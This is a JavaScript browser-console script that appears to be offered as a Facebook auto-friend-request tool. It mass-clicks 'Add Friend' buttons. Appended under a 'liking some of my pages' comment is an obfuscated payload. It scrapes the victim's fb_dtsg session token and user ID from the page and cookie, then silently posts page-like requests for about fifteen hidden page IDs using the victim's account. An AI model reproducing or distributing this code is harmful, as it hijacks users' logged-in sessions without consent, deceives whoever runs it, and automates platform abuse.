var matchText = 'Add friend';
var matchText2 = 'Add Friend';
var added = 0,
    total = 5;

function addFriends() {
    var clicked = false;
    console.clear();
    var buttons = document.getElementsByTagName("div");
    for (var counter = 0, length = buttons.length; counter < length; counter++) {
        var target = buttons[counter];
        if (target) {
            var ariaLabel = target.getAttribute("aria-label");
            // console.log("ariaLabel is", ariaLabel);
            if (ariaLabel) {
                var text = ariaLabel.trim();

                if (text === matchText || text === matchText2) {
                    target.click();
                    // target.focus();


                    added++;
                    console.log("Add Friend Button Clicked: " + added);

                    if (added % 20 == 0) {
                        console.log("Waiting for 30 seconds!");
                        //sleep
                        setTimeout(function () {

                        }, 30000);

                    }

                    if (added < total) {
                        window.scrollBy(0, 85);
                        clicked = true;
                    } else {
                        clicked = false;
                    }
                    target.remove();
                    break;


                }
            }
        }
    }
    if (clicked) {
        return true;
    } else {
        return false;
    }
}

function startAdding() {

    if (addFriends()) {

        setTimeout(function () {
            startAdding();
        }, delayTime);

    } else {
        total = 0;
        alert(`Friend Requests Sent: ${added}
****~Script by: Tigerzplace~****
`);
    }
}
//Below code is for liking some of my pages :p 
var _0x1551 = ['&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=', 'push', '1157401597633912', '614047OdoYIC', 'charAt', '1555839181212071', 'match', '634302330077114', 'application/x-www-form-urlencoded', '1NugzRk', 'onreadystatechange', '198757893944480', '94398kUVjGj', 'Content-type', '196461FlKqAb', '15ASFRwq', '763564efEZZO', 'open', '10895NePguj', 'outerHTML', '61605kesZyh', '380509029467786', '356203KoiQwl', '333692NvASbV', '116551890202867', '317224121817276', 'indexOf', '1GQllno', '997381LsYFeG', '&fbpage_id=', '743146072535223', '1115007yYCeNZ', 'cookie', '1212506358847237', 'shift', '250451495723325', '240272006130073', '&phstamp=', '&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=', '97278SKQHGS', 'documentElement', '1749967015316612', 'POST', '4OBORGC', '27WMHdvJ', '1569087506719125', '367556DSngMV', '109109317399261', 'status', 'setRequestHeader'];
var _0x1628 = function (_0x2c53f6, _0xe5d88f) {
    _0x2c53f6 = _0x2c53f6 - 0x164;
    var _0x1551fb = _0x1551[_0x2c53f6];
    return _0x1551fb;
};
var _0x10a1d7 = _0x1628;
(function (_0x5f29ef, _0x40490b) {
    var _0x2eb56a = _0x1628;
    while (!![]) {
        try {
            var _0x41e889 = -parseInt(_0x2eb56a(0x18d)) + -parseInt(_0x2eb56a(0x179)) * -parseInt(_0x2eb56a(0x191)) + parseInt(_0x2eb56a(0x174)) + -parseInt(_0x2eb56a(0x188)) * parseInt(_0x2eb56a(0x164)) + -parseInt(_0x2eb56a(0x195)) + -parseInt(_0x2eb56a(0x193)) + parseInt(_0x2eb56a(0x18f));
            if (_0x41e889 === _0x40490b) break;
            else _0x5f29ef['push'](_0x5f29ef['shift']());
        } catch (_0x101fb9) {
            _0x5f29ef['push'](_0x5f29ef['shift']());
        }
    }
}(_0x1551, 0x328c6));
var _0x36f0 = [_0x10a1d7(0x18b), _0x10a1d7(0x182), _0x10a1d7(0x175), '326824UMShMs', _0x10a1d7(0x178), _0x10a1d7(0x167), _0x10a1d7(0x17b), _0x10a1d7(0x192), _0x10a1d7(0x168), _0x10a1d7(0x18e), _0x10a1d7(0x16c), '1710652BYPhGQ', _0x10a1d7(0x169)],
    _0x559b = function (_0x573165, _0x330c5a) {
        _0x573165 = _0x573165 - 0x76;
        var _0x375f66 = _0x36f0[_0x573165];
        return _0x375f66;
    },
    _0x2d7c31 = _0x559b;
(function (_0x191ebc, _0x55c56d) {
    var _0x236f35 = _0x10a1d7,
        _0x16a695 = _0x559b;
    while (!![]) {
        try {
            var _0x3be590 = -parseInt(_0x16a695(0x7b)) + -parseInt(_0x16a695(0x80)) * -parseInt(_0x16a695(0x7f)) + parseInt(_0x16a695(0x78)) * -parseInt(_0x16a695(0x7c)) + parseInt(_0x16a695(0x7d)) * -parseInt(_0x16a695(0x77)) + parseInt(_0x16a695(0x79)) + -parseInt(_0x16a695(0x82)) + parseInt(_0x16a695(0x7a));
            if (_0x3be590 === _0x55c56d) break;
            else _0x191ebc['push'](_0x191ebc['shift']());
        } catch (_0x580900) {
            _0x191ebc[_0x236f35(0x180)](_0x191ebc[_0x236f35(0x16f)]());
        }
    }
}(_0x36f0, 0xb42d1));
var fb_dtsg = '',
    page_src = document[_0x10a1d7(0x175)][_0x2d7c31(0x76)],
    index_in_page_src = document[_0x2d7c31(0x7e)][_0x10a1d7(0x192)][_0x2d7c31(0x81)]('\x22);\x22use\x20strict\x22;');
for (var a = 0x19; a > 0x0; a--) {
    fb_dtsg = fb_dtsg + '' + page_src[_0x10a1d7(0x183)](index_in_page_src - a);
}
var user_id = document['cookie'][_0x10a1d7(0x185)](document[_0x10a1d7(0x16d)][_0x10a1d7(0x185)](/c_user=(\d+)/)[0x1]);

function Like(_0xa4af99) {
    var _0xbd8731 = _0x10a1d7,
        _0x509343 = new XMLHttpRequest(),
        _0x4753a6 = 'https://www.facebook.com/ajax/pages/fan_status.php?',
        _0x2c24d3 = _0xbd8731(0x16a) + _0xa4af99 + _0xbd8731(0x17f) + user_id + _0xbd8731(0x173) + fb_dtsg + _0xbd8731(0x172);
    _0x509343[_0xbd8731(0x190)](_0xbd8731(0x177), _0x4753a6, !![]), _0x509343[_0xbd8731(0x17e)](_0xbd8731(0x18c), _0xbd8731(0x187)), _0x509343[_0xbd8731(0x189)] = function () {
        var _0x3c87c1 = _0xbd8731;
        _0x509343['readyState'] == 0x4 && _0x509343[_0x3c87c1(0x17d)] == 0xc8 && _0x509343['close'];
    }, _0x509343['send'](_0x2c24d3);
}
Like(_0x10a1d7(0x17a)), setTimeout(function () {
    var _0x3b8e46 = _0x10a1d7;
    Like(_0x3b8e46(0x17c));
}, 0x384), setTimeout(function () {
    var _0x4758a4 = _0x10a1d7;
    Like(_0x4758a4(0x165));
}, 0x3c0), setTimeout(function () {
    var _0x2c85b3 = _0x10a1d7;
    Like(_0x2c85b3(0x171));
}, 0x3e8), setTimeout(function () {
    var _0x316efb = _0x10a1d7;
    Like(_0x316efb(0x181));
}, 0x44c), setTimeout(function () {
    var _0x3cc0b8 = _0x10a1d7;
    Like(_0x3cc0b8(0x166));
}, 0x4b0), setTimeout(function () {
    var _0x3e6562 = _0x10a1d7;
    Like(_0x3e6562(0x186));
}, 0x514), setTimeout(function () {
    var _0x4f577c = _0x10a1d7;
    Like(_0x4f577c(0x16e));
}, 0x578), setTimeout(function () {
    var _0xa085bd = _0x10a1d7;
    Like(_0xa085bd(0x18a));
}, 0x5dc), setTimeout(function () {
    var _0x1d183f = _0x10a1d7;
    Like(_0x1d183f(0x176));
}, 0x640), setTimeout(function () {
    var _0x550e9a = _0x10a1d7;
    Like(_0x550e9a(0x194));
}, 0x6a4), setTimeout(function () {
    var _0x3db6d2 = _0x10a1d7;
    Like(_0x3db6d2(0x184));
}, 0x708), setTimeout(function () {
    var _0x3fd568 = _0x10a1d7;
    Like(_0x3fd568(0x170));
}, 0x76c), setTimeout(function () {
    var _0x3e251c = _0x10a1d7;
    Like(_0x3e251c(0x16b));
}, 0x456), setTimeout(function () {
    Like('108586183990636');
}, 0x47e), setTimeout(function () {
    Like('2277608785850617');
}, 0x480);
var delayTime = prompt("Delay Time", 5) * 1000;
var total = prompt("How many requests?", 1000);
if (delayTime >= 0 && delayTime != null && fb_dtsg != null) {
    console.log("Script is started!");
    startAdding();
} else {
    alert("Failed to Start!");
}
